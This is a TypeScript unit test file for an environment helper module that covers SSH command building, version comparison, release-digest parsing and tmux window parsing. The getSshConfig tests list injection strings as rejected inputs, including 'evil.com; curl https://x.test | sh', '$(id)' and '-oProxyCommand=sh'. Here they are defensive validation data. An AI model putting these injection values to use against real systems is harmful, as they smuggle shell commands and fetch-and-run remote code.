import { afterEach, describe, expect, it, spyOn } from 'bun:test';
import * as childProcess from 'child_process';
import { EventEmitter } from 'events';
import { PassThrough } from 'stream';
import {
  execSafe,
  getSshConfig,
  parseManagedVersionResponse,
  parseTmuxWindows,
  updateAvailableFor,
} from '../environment';

describe('execSafe', () => {
  it('decodes a character split across two output chunks', async () => {
    // A stand-in child, so the test never depends on what another file did to spawn.
    const stdout = new PassThrough();
    const child = Object.assign(new EventEmitter(), { stdout, stderr: new PassThrough(), kill: () => true });
    const spawn = spyOn(childProcess, 'spawn').mockImplementation(
      (() => child) as unknown as typeof childProcess.spawn
    );
    try {
      const result = execSafe('tmux save-buffer -b envhaven-selection -');
      stdout.write(Buffer.from([0x68, 0xc3])); // "h" and the first byte of "é"
      stdout.write(Buffer.from([0xa9, 0x0a]));
      stdout.end();
      await new Promise((resolve) => setTimeout(resolve, 10));
      child.emit('close', 0);
      expect((await result).stdout).toBe('hé\n');
    } finally {
      spawn.mockRestore();
    }
  });
});

describe('getSshConfig', () => {
  const saved = {
    ENVHAVEN_MANAGED: process.env.ENVHAVEN_MANAGED,
    ENVHAVEN_SSH_HOST: process.env.ENVHAVEN_SSH_HOST,
    ENVHAVEN_SSH_PORT: process.env.ENVHAVEN_SSH_PORT,
  };

  function setEnv(managed: boolean, host?: string, port?: string): void {
    process.env.ENVHAVEN_MANAGED = managed ? 'true' : 'false';
    if (host === undefined) delete process.env.ENVHAVEN_SSH_HOST;
    else process.env.ENVHAVEN_SSH_HOST = host;
    if (port === undefined) delete process.env.ENVHAVEN_SSH_PORT;
    else process.env.ENVHAVEN_SSH_PORT = port;
  }

  afterEach(() => {
    for (const [name, value] of Object.entries(saved)) {
      if (value === undefined) delete process.env[name];
      else process.env[name] = value;
    }
  });

  it('builds the managed commands from the ssh- hostname', () => {
    setEnv(true, 'ssh-abc.envhaven.app');
    expect(getSshConfig()).toEqual({
      host: 'ssh-abc.envhaven.app',
      port: 22,
      command: 'ssh abc@ssh-abc.envhaven.app',
      havenCommand: 'haven connect . abc',
      configured: true,
    });
  });

  it('builds the self-hosted commands from a hostname or IP literal and its port', () => {
    setEnv(false, '192.168.1.100', '2222');
    expect(getSshConfig().command).toBe('ssh abc@192.168.1.100 -p 2222');
    expect(getSshConfig().havenCommand).toBe('haven connect . abc@192.168.1.100:2222');
    setEnv(false, 'my_box.tail1234.ts.net', '22');
    expect(getSshConfig().command).toBe('ssh abc@my_box.tail1234.ts.net');
    setEnv(false, 'fe80::1%eth0');
    expect(getSshConfig().command).toBe('ssh abc@fe80::1%eth0 -p 2222');
  });

  it('falls back to the placeholder for a host that is not a hostname or IP literal', () => {
    for (const host of [
      'evil.com; curl https://x.test | sh',
      '$(id)',
      '`id`',
      'host name',
      'host\nid',
      "host'quoted'",
      '-oProxyCommand=sh',
      'example.com-',
      'fe80::1%eth0;id',
    ]) {
      setEnv(false, host, '2222');
      const ssh = getSshConfig();
      expect(ssh.configured).toBe(false);
      expect(ssh.command).toBe('ssh abc@<host> -p 2222');
      expect(ssh.havenCommand).toBe('haven connect . abc@<host>:2222');
    }
  });

  it('falls back to the default port for one that is not a port number', () => {
    for (const port of ['22; id', '0', '65536', 'ssh', '2222 ', '-1']) {
      setEnv(false, 'example.com', port);
      expect(getSshConfig().port).toBe(2222);
      setEnv(true, 'ssh-abc.envhaven.app', port);
      expect(getSshConfig().command).toBe('ssh abc@ssh-abc.envhaven.app');
    }
  });
});

describe('updateAvailableFor', () => {
  it('offers a newer release over an older one', () => {
    expect(updateAvailableFor('v1.7.4', 'v1.7.5')).toBe(true);
    expect(updateAvailableFor('v1.8.0', 'v1.8.1')).toBe(true);
    expect(updateAvailableFor('1.9.9', '1.10.0')).toBe(true); // components compare as numbers, so 9 sorts before 10
    expect(updateAvailableFor('v1.7.5', 'v1.7.5')).toBe(false);
  });
  it('never offers a pinned or rolled-back latest', () => {
    expect(updateAvailableFor('v1.8.2', 'v1.8.1')).toBe(false);
  });
  it('fails closed for dev builds, prereleases and unknown labels', () => {
    expect(updateAvailableFor('dev', 'v1.7.5')).toBe(false);
    expect(updateAvailableFor('dev-abc1234', 'v1.7.5')).toBe(false);
    expect(updateAvailableFor('devel', 'v1.7.5')).toBe(false);
    expect(updateAvailableFor('v1.9.0-rc.1', 'v1.8.1')).toBe(false);
    expect(updateAvailableFor('v1.8.0', 'v1.9.0-rc.1')).toBe(false);
  });
  it('is silent without both versions', () => {
    expect(updateAvailableFor(null, 'v1.7.5')).toBe(false);
    expect(updateAvailableFor('v1.7.4', null)).toBe(false);
  });
});

describe('parseManagedVersionResponse', () => {
  const digest = `sha256:${'a'.repeat(64)}`;

  it('accepts one internally consistent immutable release object', () => {
    expect(parseManagedVersionResponse({
      latest: 'v1.8.0',
      latestDigest: digest,
      imageReference: `ghcr.io/envhaven/envhaven@${digest}`,
    })).toEqual({
      latest: 'v1.8.0',
      latestDigest: digest,
      imageReference: `ghcr.io/envhaven/envhaven@${digest}`,
    });
  });

  it('fails closed for legacy or mismatched managed responses', () => {
    const empty = { latest: null, latestDigest: null, imageReference: null };
    expect(parseManagedVersionResponse({ latest: 'v1.8.0' })).toEqual(empty);
    expect(parseManagedVersionResponse({
      latest: 'v1.8.0',
      latestDigest: digest,
      imageReference: `ghcr.io/envhaven/envhaven@sha256:${'b'.repeat(64)}`,
    })).toEqual(empty);
  });
});

describe('parseTmuxWindows', () => {
  it('keeps a "|" inside a window name whole (name is the last field)', () => {
    expect(parseTmuxWindows('1|0|my|piped|name')[0]).toEqual({ index: 1, name: 'my|piped|name', active: false });
  });

  it('marks the active window and parses the index', () => {
    expect(parseTmuxWindows('2|1|zsh')[0]).toEqual({ index: 2, name: 'zsh', active: true });
  });

  it('falls back to `Window <index>` when the name is empty', () => {
    expect(parseTmuxWindows('3|0|')[0]).toEqual({ index: 3, name: 'Window 3', active: false });
  });

  it('returns an empty list for empty output', () => {
    expect(parseTmuxWindows('')).toEqual([]);
  });

  it('parses every line of a multi-window session', () => {
    expect(parseTmuxWindows('0|1|zsh\n1|0|claude')).toHaveLength(2);
  });
});
